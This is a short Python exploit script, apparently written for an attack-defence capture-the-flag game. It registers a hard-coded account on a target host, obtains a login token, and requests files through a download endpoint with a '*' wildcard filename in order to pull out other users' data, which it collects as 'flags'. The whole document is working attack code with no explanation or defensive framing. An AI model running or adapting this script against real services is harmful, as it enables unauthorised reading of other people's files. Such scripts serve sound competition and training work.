import requests
import json
import sys

INFO = 'pentester123'
LOGIN = 'hacker3434'
PASSWORD = 'hahacker'
FILENAME = '*'
FORMAT = '.csv'
PORT = 8000
ROUNDS = 1


def register(url):
    creds = {"username": LOGIN, "password": PASSWORD, "info": INFO}
    r = requests.post(f'{url}/register', json=creds)
    print(r.text)


def login(url):
    creds = {"username": LOGIN, "password": PASSWORD}
    r = requests.post(f'{url}/login', json=creds)
    token = json.loads(r.text)["token"]
    print(token)
    print(r.text)
    return token


def main():
    """
    Надо передавать токен авторизации и filename для запроса
    """
    args = sys.argv[1:]
    print(args[0])
    url = f'http://{args[0]}:{PORT}/api'
    register(url)
    auth_header = {'Authorization': f'Bearer {login(url)}'}
    flags = []
    for i in range(ROUNDS + 1):
        r = requests.get(f'{url}/download?filename={FILENAME+str(i)+FORMAT}',
                         headers=auth_header)
        if r.status_code == 200:
            flags.append(r.text)
    return list(filter(None, flags))


if __name__ == "__main__":
    print(main())
